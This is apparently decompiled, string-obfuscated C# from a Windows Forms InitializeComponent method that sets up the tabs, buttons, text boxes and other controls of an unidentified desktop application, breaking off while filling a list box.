		//IL_11423: Unknown result type (might be due to invalid IL or missing references)
		//IL_1142d: Expected O, but got Unknown
		//IL_11461: Unknown result type (might be due to invalid IL or missing references)
		//IL_11545: Unknown result type (might be due to invalid IL or missing references)
		//IL_1154f: Expected O, but got Unknown
		//IL_11580: Unknown result type (might be due to invalid IL or missing references)
		//IL_11660: Unknown result type (might be due to invalid IL or missing references)
		//IL_1166a: Expected O, but got Unknown
		//IL_1169e: Unknown result type (might be due to invalid IL or missing references)
		//IL_11749: Unknown result type (might be due to invalid IL or missing references)
		//IL_11811: Unknown result type (might be due to invalid IL or missing references)
		//IL_1181b: Expected O, but got Unknown
		//IL_11852: Unknown result type (might be due to invalid IL or missing references)
		//IL_11933: Unknown result type (might be due to invalid IL or missing references)
		//IL_1193d: Expected O, but got Unknown
		//IL_11974: Unknown result type (might be due to invalid IL or missing references)
		//IL_11a56: Unknown result type (might be due to invalid IL or missing references)
		//IL_11a60: Expected O, but got Unknown
		//IL_11a97: Unknown result type (might be due to invalid IL or missing references)
		//IL_11b76: Unknown result type (might be due to invalid IL or missing references)
		//IL_11b80: Expected O, but got Unknown
		//IL_11bb3: Unknown result type (might be due to invalid IL or missing references)
		//IL_11c83: Unknown result type (might be due to invalid IL or missing references)
		//IL_11d54: Unknown result type (might be due to invalid IL or missing references)
		//IL_11d5e: Expected O, but got Unknown
		//IL_11d92: Unknown result type (might be due to invalid IL or missing references)
		//IL_11e6d: Unknown result type (might be due to invalid IL or missing references)
		//IL_11f3a: Unknown result type (might be due to invalid IL or missing references)
		//IL_11f44: Expected O, but got Unknown
		//IL_11f77: Unknown result type (might be due to invalid IL or missing references)
		//IL_12043: Unknown result type (might be due to invalid IL or missing references)
		//IL_120d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_120db: Expected O, but got Unknown
		//IL_1210c: Unknown result type (might be due to invalid IL or missing references)
		//IL_121c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_121d0: Expected O, but got Unknown
		//IL_12203: Unknown result type (might be due to invalid IL or missing references)
		//IL_1256a: Unknown result type (might be due to invalid IL or missing references)
		//IL_125f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_12602: Expected O, but got Unknown
		//IL_12639: Unknown result type (might be due to invalid IL or missing references)
		//IL_126fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_12708: Expected O, but got Unknown
		//IL_1273b: Unknown result type (might be due to invalid IL or missing references)
		//IL_1281d: Unknown result type (might be due to invalid IL or missing references)
		//IL_12827: Expected O, but got Unknown
		//IL_1285b: Unknown result type (might be due to invalid IL or missing references)
		//IL_1293d: Unknown result type (might be due to invalid IL or missing references)
		//IL_12947: Expected O, but got Unknown
		//IL_1297e: Unknown result type (might be due to invalid IL or missing references)
		//IL_12a5a: Unknown result type (might be due to invalid IL or missing references)
		//IL_12a64: Expected O, but got Unknown
		//IL_12a95: Unknown result type (might be due to invalid IL or missing references)
		//IL_12b6d: Unknown result type (might be due to invalid IL or missing references)
		//IL_12b77: Expected O, but got Unknown
		//IL_133e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_13484: Unknown result type (might be due to invalid IL or missing references)
		//IL_1348e: Expected O, but got Unknown
		//IL_13544: Unknown result type (might be due to invalid IL or missing references)
		//IL_1354e: Expected O, but got Unknown
		//IL_13582: Unknown result type (might be due to invalid IL or missing references)
		//IL_13634: Unknown result type (might be due to invalid IL or missing references)
		//IL_1363e: Expected O, but got Unknown
		//IL_13703: Unknown result type (might be due to invalid IL or missing references)
		//IL_1370d: Expected O, but got Unknown
		//IL_13744: Unknown result type (might be due to invalid IL or missing references)
		//IL_137f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_13803: Expected O, but got Unknown
		//IL_13837: Unknown result type (might be due to invalid IL or missing references)
		//IL_138e1: Unknown result type (might be due to invalid IL or missing references)
		//IL_138eb: Expected O, but got Unknown
		//IL_139a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_139ad: Expected O, but got Unknown
		//IL_139e1: Unknown result type (might be due to invalid IL or missing references)
		//IL_13a88: Unknown result type (might be due to invalid IL or missing references)
		//IL_13a92: Expected O, but got Unknown
		//IL_13b3a: Unknown result type (might be due to invalid IL or missing references)
		//IL_13b44: Expected O, but got Unknown
		//IL_13bed: Unknown result type (might be due to invalid IL or missing references)
		//IL_13bf7: Expected O, but got Unknown
		//IL_13cac: Unknown result type (might be due to invalid IL or missing references)
		//IL_13cb6: Expected O, but got Unknown
		//IL_13cea: Unknown result type (might be due to invalid IL or missing references)
		//IL_13d9b: Unknown result type (might be due to invalid IL or missing references)
		//IL_13da5: Expected O, but got Unknown
		//IL_13dd9: Unknown result type (might be due to invalid IL or missing references)
		//IL_13e89: Unknown result type (might be due to invalid IL or missing references)
		//IL_13e93: Expected O, but got Unknown
		//IL_13ec4: Unknown result type (might be due to invalid IL or missing references)
		//IL_13f80: Unknown result type (might be due to invalid IL or missing references)
		//IL_14045: Unknown result type (might be due to invalid IL or missing references)
		//IL_1404f: Expected O, but got Unknown
		//IL_14083: Unknown result type (might be due to invalid IL or missing references)
		//IL_14163: Unknown result type (might be due to invalid IL or missing references)
		//IL_1416d: Expected O, but got Unknown
		//IL_141a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_14252: Unknown result type (might be due to invalid IL or missing references)
		//IL_14302: Unknown result type (might be due to invalid IL or missing references)
		//IL_1430c: Expected O, but got Unknown
		//IL_14343: Unknown result type (might be due to invalid IL or missing references)
		//IL_1442a: Unknown result type (might be due to invalid IL or missing references)
		//IL_14434: Expected O, but got Unknown
		//IL_14467: Unknown result type (might be due to invalid IL or missing references)
		//IL_14543: Unknown result type (might be due to invalid IL or missing references)
		//IL_1454d: Expected O, but got Unknown
		//IL_14580: Unknown result type (might be due to invalid IL or missing references)
		//IL_14649: Unknown result type (might be due to invalid IL or missing references)
		//IL_147cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_147d9: Expected O, but got Unknown
		//IL_147df: Unknown result type (might be due to invalid IL or missing references)
		tabPage2 = new TabPage();
		label10 = new Label();
		label9 = new Label();
		button10 = new Button();
		button9 = new Button();
		textBox4 = new TextBox();
		textBox2 = new TextBox();
		button8 = new Button();
		button7 = new Button();
		tabPage2tsad = new TabPage();
		progressBar2 = new ProgressBar();
		button6 = new Button();
		label8 = new Label();
		listBox1 = new ListBox();
		label7 = new Label();
		label6 = new Label();
		label5 = new Label();
		checkBox8 = new CheckBox();
		checkBox7 = new CheckBox();
		checkBox6 = new CheckBox();
		checkBox5 = new CheckBox();
		checkBox4 = new CheckBox();
		checkBox3 = new CheckBox();
		button2 = new Button();
		label4 = new Label();
		pictureBox4 = new PictureBox();
		tabPage1 = new TabPage();
		button31 = new Button();
		button30 = new Button();
		button29 = new Button();
		pictureBox10 = new PictureBox();
		pictureBox9 = new PictureBox();
		button28 = new Button();
		button27 = new Button();
		button26 = new Button();
		button25 = new Button();
		checkBox2 = new CheckBox();
		checkBox1 = new CheckBox();
		button24 = new Button();
		button23 = new Button();
		button22 = new Button();
		button21 = new Button();
		button20 = new Button();
		button19 = new Button();
		button18 = new Button();
		button17 = new Button();
		comboBox9 = new ComboBox();
		comboBox7 = new ComboBox();
		label34 = new Label();
		comboBox8 = new ComboBox();
		label35 = new Label();
		textBox19 = new TextBox();
		label33 = new Label();
		textBox16 = new TextBox();
		textBox17 = new TextBox();
		textBox18 = new TextBox();
		label30 = new Label();
		label31 = new Label();
		label32 = new Label();
		label28 = new Label();
		label27 = new Label();
		textBox13 = new TextBox();
		textBox14 = new TextBox();
		textBox15 = new TextBox();
		label29 = new Label();
		textBox10 = new TextBox();
		textBox11 = new TextBox();
		textBox12 = new TextBox();
		label24 = new Label();
		label25 = new Label();
		label26 = new Label();
		comboBox6 = new ComboBox();
		label23 = new Label();
		comboBox5 = new ComboBox();
		label22 = new Label();
		comboBox4 = new ComboBox();
		label21 = new Label();
		button4 = new Button();
		comboBox3 = new ComboBox();
		comboBox2 = new ComboBox();
		textBox8 = new TextBox();
		textBox7 = new TextBox();
		textBox6 = new TextBox();
		label20 = new Label();
		label19 = new Label();
		label18 = new Label();
		label17 = new Label();
		label16 = new Label();
		label15 = new Label();
		label14 = new Label();
		textBox5 = new TextBox();
		textBox3 = new TextBox();
		textBox1 = new TextBox();
		label13 = new Label();
		label12 = new Label();
		label3 = new Label();
		pictureBox8 = new PictureBox();
		pictureBox7 = new PictureBox();
		pictureBox3 = new PictureBox();
		pictureBox6 = new PictureBox();
		button16 = new Button();
		button15 = new Button();
		label11 = new Label();
		pictureBox5 = new PictureBox();
		button14 = new Button();
		button13 = new Button();
		button12 = new Button();
		button11 = new Button();
		pictureBox1 = new PictureBox();
		button1 = new Button();
		pictureBox2 = new PictureBox();
		button3 = new Button();
		progressBar1 = new ProgressBar();
		label1 = new Label();
		button5 = new Button();
		comboBox1 = new ComboBox();
		tabControl1 = new TabControl();
		tabPage3 = new TabPage();
		pictureBox21 = new PictureBox();
		pictureBox20 = new PictureBox();
		label2 = new Label();
		button32 = new Button();
		button83 = new Button();
		button84 = new Button();
		button87 = new Button();
		button91 = new Button();
		button92 = new Button();
		button93 = new Button();
		button94 = new Button();
		button96 = new Button();
		comboBox10 = new ComboBox();
		textBox20 = new TextBox();
		textBox54 = new TextBox();
		label38 = new Label();
		label94 = new Label();
		label95 = new Label();
		label96 = new Label();
		textBox55 = new TextBox();
		textBox56 = new TextBox();
		textBox57 = new TextBox();
		label97 = new Label();
		comboBox35 = new ComboBox();
		label104 = new Label();
		label110 = new Label();
		textBox64 = new TextBox();
		textBox65 = new TextBox();
		textBox66 = new TextBox();
		label111 = new Label();
		label112 = new Label();
		label113 = new Label();
		pictureBox31 = new PictureBox();
		button98 = new Button();
		button99 = new Button();
		label114 = new Label();
		pictureBox35 = new PictureBox();
		button100 = new Button();
		button101 = new Button();
		button102 = new Button();
		button103 = new Button();
		pictureBox36 = new PictureBox();
		button104 = new Button();
		button105 = new Button();
		progressBar5 = new ProgressBar();
		label115 = new Label();
		button106 = new Button();
		comboBox36 = new ComboBox();
		tabPage4 = new TabPage();
		button33 = new Button();
		button34 = new Button();
		button35 = new Button();
		pictureBox11 = new PictureBox();
		pictureBox12 = new PictureBox();
		button36 = new Button();
		button37 = new Button();
		button38 = new Button();
		button39 = new Button();
		checkBox9 = new CheckBox();
		checkBox10 = new CheckBox();
		button40 = new Button();
		button41 = new Button();
		button42 = new Button();
		button43 = new Button();
		button44 = new Button();
		button45 = new Button();
		button46 = new Button();
		button47 = new Button();
		comboBox11 = new ComboBox();
		textBox22 = new TextBox();
		label41 = new Label();
		textBox23 = new TextBox();
		textBox24 = new TextBox();
		textBox25 = new TextBox();
		label42 = new Label();
		label43 = new Label();
		label44 = new Label();
		label45 = new Label();
		label46 = new Label();
		textBox26 = new TextBox();
		textBox27 = new TextBox();
		textBox28 = new TextBox();
		label47 = new Label();
		textBox29 = new TextBox();
		textBox30 = new TextBox();
		textBox31 = new TextBox();
		label48 = new Label();
		label49 = new Label();
		label50 = new Label();
		comboBox14 = new ComboBox();
		label51 = new Label();
		comboBox15 = new ComboBox();
		label52 = new Label();
		comboBox16 = new ComboBox();
		label53 = new Label();
		comboBox18 = new ComboBox();
		textBox32 = new TextBox();
		textBox33 = new TextBox();
		textBox34 = new TextBox();
		label54 = new Label();
		label57 = new Label();
		label58 = new Label();
		label59 = new Label();
		label60 = new Label();
		textBox35 = new TextBox();
		textBox36 = new TextBox();
		textBox37 = new TextBox();
		label61 = new Label();
		label62 = new Label();
		label63 = new Label();
		pictureBox13 = new PictureBox();
		pictureBox14 = new PictureBox();
		pictureBox15 = new PictureBox();
		pictureBox16 = new PictureBox();
		button49 = new Button();
		button50 = new Button();
		label64 = new Label();
		pictureBox17 = new PictureBox();
		button51 = new Button();
		button52 = new Button();
		button53 = new Button();
		button54 = new Button();
		pictureBox18 = new PictureBox();
		button55 = new Button();
		pictureBox19 = new PictureBox();
		button56 = new Button();
		progressBar3 = new ProgressBar();
		label65 = new Label();
		button57 = new Button();
		tabPage5 = new TabPage();
		label39 = new Label();
		button60 = new Button();
		button67 = new Button();
		button71 = new Button();
		button72 = new Button();
		comboBox20 = new ComboBox();
		textBox39 = new TextBox();
		label69 = new Label();
		textBox45 = new TextBox();
		label76 = new Label();
		label77 = new Label();
		textBox48 = new TextBox();
		label87 = new Label();
		textBox51 = new TextBox();
		textBox52 = new TextBox();
		textBox53 = new TextBox();
		label88 = new Label();
		label89 = new Label();
		label90 = new Label();
		pictureBox22 = new PictureBox();
		button74 = new Button();
		label91 = new Label();
		pictureBox26 = new PictureBox();
		button76 = new Button();
		button78 = new Button();
		button81 = new Button();
		progressBar4 = new ProgressBar();
		lblWarning = new Label();
		((Control)tabPage2).SuspendLayout();
		((Control)tabPage2tsad).SuspendLayout();
		((ISupportInitialize)pictureBox4).BeginInit();
		((Control)tabPage1).SuspendLayout();
		((ISupportInitialize)pictureBox10).BeginInit();
		((ISupportInitialize)pictureBox9).BeginInit();
		((ISupportInitialize)pictureBox8).BeginInit();
		((ISupportInitialize)pictureBox7).BeginInit();
		((ISupportInitialize)pictureBox3).BeginInit();
		((ISupportInitialize)pictureBox6).BeginInit();
		((ISupportInitialize)pictureBox5).BeginInit();
		((ISupportInitialize)pictureBox1).BeginInit();
		((ISupportInitialize)pictureBox2).BeginInit();
		((Control)tabControl1).SuspendLayout();
		((Control)tabPage3).SuspendLayout();
		((ISupportInitialize)pictureBox21).BeginInit();
		((ISupportInitialize)pictureBox20).BeginInit();
		((ISupportInitialize)pictureBox31).BeginInit();
		((ISupportInitialize)pictureBox35).BeginInit();
		((ISupportInitialize)pictureBox36).BeginInit();
		((Control)tabPage4).SuspendLayout();
		((ISupportInitialize)pictureBox11).BeginInit();
		((ISupportInitialize)pictureBox12).BeginInit();
		((ISupportInitialize)pictureBox13).BeginInit();
		((ISupportInitialize)pictureBox14).BeginInit();
		((ISupportInitialize)pictureBox15).BeginInit();
		((ISupportInitialize)pictureBox16).BeginInit();
		((ISupportInitialize)pictureBox17).BeginInit();
		((ISupportInitialize)pictureBox18).BeginInit();
		((ISupportInitialize)pictureBox19).BeginInit();
		((Control)tabPage5).SuspendLayout();
		((ISupportInitialize)pictureBox22).BeginInit();
		((ISupportInitialize)pictureBox26).BeginInit();
		((Control)this).SuspendLayout();
		((Control)tabPage2).BackColor = Color.FromArgb(16, 26, 40);
		((Control)tabPage2).Controls.Add((Control)(object)label10);
		((Control)tabPage2).Controls.Add((Control)(object)label9);
		((Control)tabPage2).Controls.Add((Control)(object)button10);
		((Control)tabPage2).Controls.Add((Control)(object)button9);
		((Control)tabPage2).Controls.Add((Control)(object)textBox4);
		((Control)tabPage2).Controls.Add((Control)(object)textBox2);
		((Control)tabPage2).Controls.Add((Control)(object)button8);
		((Control)tabPage2).Controls.Add((Control)(object)button7);
		tabPage2.Location = new Point(4, 54);
		((Control)tabPage2).Margin = new Padding(5, 3, 5, 3);
		((Control)tabPage2).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(-1602055031 ^ -2032724975 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_2f12304c094c4981ae78cdfa1dc9cd9e);
		((Control)tabPage2).Padding = new Padding(5, 3, 5, 3);
		((Control)tabPage2).Size = new Size(1251, 705);
		tabPage2.TabIndex = 2;
		((Control)tabPage2).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1CB3C630 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_8d38eba5cedc4c1fa516f3280fa0cc49);
		((Control)label10).AutoSize = true;
		((Control)label10).ForeColor = SystemColors.ControlLightLight;
		((Control)label10).Location = new Point(133, 228);
		((Control)label10).Margin = new Padding(5, 0, 5, 0);
		((Control)label10).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x22F1AFD4 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_69dd1a730f2a42979206d319258f7586);
		((Control)label10).Size = new Size(155, 19);
		((Control)label10).TabIndex = 8;
		((Control)label10).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(-1646586438 ^ -1090414795 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_dcdaa6b2b9864be395d7b1ef5fda91ed);
		((Control)label9).AutoSize = true;
		((Control)label9).ForeColor = SystemColors.ControlLightLight;
		((Control)label9).Location = new Point(133, 109);
		((Control)label9).Margin = new Padding(5, 0, 5, 0);
		((Control)label9).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x137401B9 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_5c341600f0874de8892147931a071d76);
		((Control)label9).Size = new Size(254, 19);
		((Control)label9).TabIndex = 7;
		((Control)label9).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x22DA82D3 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_dcdaa6b2b9864be395d7b1ef5fda91ed);
		((Control)button10).BackColor = Color.Green;
		((Control)button10).ForeColor = SystemColors.ControlLightLight;
		((Control)button10).Location = new Point(690, 420);
		((Control)button10).Margin = new Padding(5, 3, 5, 3);
		((Control)button10).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1F03D9D3 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_ba511a03f3884e04a1032f95e5af7ce7);
		((Control)button10).Size = new Size(342, 76);
		((Control)button10).TabIndex = 6;
		((Control)button10).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1BA115DE ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_13ebf17f56b549d9971d1dc2218be2ad);
		((ButtonBase)button10).UseVisualStyleBackColor = false;
		((Control)button10).Click += button10_Click;
		((Control)button9).BackColor = Color.Blue;
		((Control)button9).ForeColor = SystemColors.ControlLightLight;
		((Control)button9).Location = new Point(128, 420);
		((Control)button9).Margin = new Padding(5, 3, 5, 3);
		((Control)button9).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x387F6135 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_903c9fa40f3d4d0fb3bcd63cbccd82bc);
		((Control)button9).Size = new Size(342, 76);
		((Control)button9).TabIndex = 5;
		((Control)button9).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1160AF9C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_07094e8430e84644a3b46793c68193e0);
		((ButtonBase)button9).UseVisualStyleBackColor = false;
		((Control)button9).Click += button9_Click;
		((Control)textBox4).BackColor = SystemColors.ScrollBar;
		((Control)textBox4).ForeColor = SystemColors.WindowFrame;
		((Control)textBox4).Location = new Point(322, 270);
		((Control)textBox4).Margin = new Padding(5, 3, 5, 3);
		((Control)textBox4).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(--328687871 ^ 0xF24A405 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_8d38eba5cedc4c1fa516f3280fa0cc49);
		((Control)textBox4).Size = new Size(710, 26);
		((Control)textBox4).TabIndex = 4;
		((Control)textBox4).TextChanged += textBox4_TextChanged;
		((Control)textBox2).BackColor = SystemColors.ScrollBar;
		((Control)textBox2).ForeColor = SystemColors.WindowFrame;
		((Control)textBox2).Location = new Point(322, 150);
		((Control)textBox2).Margin = new Padding(5, 3, 5, 3);
		((Control)textBox2).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2655826A ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_2f12304c094c4981ae78cdfa1dc9cd9e);
		((Control)textBox2).Size = new Size(710, 26);
		((Control)textBox2).TabIndex = 2;
		((Control)textBox2).TextChanged += textBox2_TextChanged;
		((Control)button8).BackColor = Color.FromArgb(64, 64, 64);
		((Control)button8).ForeColor = SystemColors.ControlLightLight;
		((Control)button8).Location = new Point(128, 266);
		((Control)button8).Margin = new Padding(5, 3, 5, 3);
		((Control)button8).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(--932377358 ^ 0x571C40AA ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_437346f465ec4c2688d96b0e0f9b04a9);
		((Control)button8).Size = new Size(158, 38);
		((Control)button8).TabIndex = 1;
		((Control)button8).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x74DB33D3 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_904c7ffdb8fc47b685c80da894c6344f);
		((ButtonBase)button8).UseVisualStyleBackColor = false;
		((Control)button8).Click += button8_Click;
		((Control)button7).BackColor = Color.FromArgb(64, 64, 64);
		((Control)button7).ForeColor = SystemColors.ControlLightLight;
		((Control)button7).Location = new Point(128, 146);
		((Control)button7).Margin = new Padding(5, 3, 5, 3);
		((Control)button7).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0xD9F342D ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0833f608dcca449f93bb40a86263840a);
		((Control)button7).Size = new Size(158, 38);
		((Control)button7).TabIndex = 0;
		((Control)button7).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x10ACB35D ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6ae29e5e756542b6a6630ad169e9dc76);
		((ButtonBase)button7).UseVisualStyleBackColor = false;
		((Control)button7).Click += button7_Click;
		((Control)tabPage2tsad).BackColor = Color.FromArgb(16, 26, 40);
		((Control)tabPage2tsad).Controls.Add((Control)(object)progressBar2);
		((Control)tabPage2tsad).Controls.Add((Control)(object)button6);
		((Control)tabPage2tsad).Controls.Add((Control)(object)label8);
		((Control)tabPage2tsad).Controls.Add((Control)(object)listBox1);
		((Control)tabPage2tsad).Controls.Add((Control)(object)label7);
		((Control)tabPage2tsad).Controls.Add((Control)(object)label6);
		((Control)tabPage2tsad).Controls.Add((Control)(object)label5);
		((Control)tabPage2tsad).Controls.Add((Control)(object)checkBox8);
		((Control)tabPage2tsad).Controls.Add((Control)(object)checkBox7);
		((Control)tabPage2tsad).Controls.Add((Control)(object)checkBox6);
		((Control)tabPage2tsad).Controls.Add((Control)(object)checkBox5);
		((Control)tabPage2tsad).Controls.Add((Control)(object)checkBox4);
		((Control)tabPage2tsad).Controls.Add((Control)(object)checkBox3);
		((Control)tabPage2tsad).Controls.Add((Control)(object)button2);
		((Control)tabPage2tsad).Controls.Add((Control)(object)label4);
		((Control)tabPage2tsad).Controls.Add((Control)(object)pictureBox4);
		tabPage2tsad.Location = new Point(4, 54);
		((Control)tabPage2tsad).Margin = new Padding(5, 3, 5, 3);
		((Control)tabPage2tsad).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x3A639875 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a1a7f7f522cd4535b40d954ec9f98427);
		((Control)tabPage2tsad).Padding = new Padding(5, 3, 5, 3);
		((Control)tabPage2tsad).Size = new Size(1251, 705);
		tabPage2tsad.TabIndex = 1;
		((Control)tabPage2tsad).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(--932377358 ^ 0x7A31F11B ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_8350575ae23c47268ab6d6a27e6944ee);
		((Control)progressBar2).Location = new Point(54, 518);
		((Control)progressBar2).Margin = new Padding(5, 3, 5, 3);
		((Control)progressBar2).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x54C1075A ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_79a180699bf54d4d83e647d26385348a);
		((Control)progressBar2).Size = new Size(1142, 27);
		((Control)progressBar2).TabIndex = 16;
		((Control)button6).BackColor = Color.Blue;
		((Control)button6).ForeColor = SystemColors.ControlLightLight;
		((Control)button6).Location = new Point(472, 412);
		((Control)button6).Margin = new Padding(5, 3, 5, 3);
		((Control)button6).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x54044BB3 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_d2a5bdc84a4644acb5d9fa871e9d89cc);
		((Control)button6).Size = new Size(224, 72);
		((Control)button6).TabIndex = 15;
		((Control)button6).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x7FC90076 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_f6b54f43bc5c4099a4aa9b9155cdd47a);
		((ButtonBase)button6).UseVisualStyleBackColor = false;
		((Control)button6).Click += button6_Click;
		((Control)label8).AutoSize = true;
		((Control)label8).ForeColor = SystemColors.ControlLightLight;
		((Control)label8).Location = new Point(362, 19);
		((Control)label8).Margin = new Padding(5, 0, 5, 0);
		((Control)label8).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x75BF922C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6e6f96868e8e46d3959156c0871dafbc);
		((Control)label8).Size = new Size(178, 38);
		((Control)label8).TabIndex = 14;
		((Control)label8).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x24C4D8E ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_f21b1171952f4cd2aae5d7be2be94970);
		((Control)listBox1).BackColor = SystemColors.ControlDarkDark;
		((Control)listBox1).ForeColor = SystemColors.Window;
		((ListControl)listBox1).FormattingEnabled = true;
		listBox1.ItemHeight = 19;
		listBox1.Items.AddRange(new object[34]
		{
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x736E01F9 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_3236a4e0edc64b94986eb76d39096e40),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x589A4EA0 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a578ede9d9414aabbdcf1d01b7348baf),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x10ACB4AD ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6ae29e5e756542b6a6630ad169e9dc76),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x22DA8421 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_dcdaa6b2b9864be395d7b1ef5fda91ed),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x30028649 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_fe963489b71c4328899bd0cc4b7f7da9),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x7DC103AC ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a0a12e2948a64c7f9bea608a6f866e06),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x46BC8687 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_7539847744bb4f3f89a249de2658ea6a),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x42FE9520 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_ce14555c8e314f729d5e754b0132dafe),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1374068B ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_5c341600f0874de8892147931a071d76),
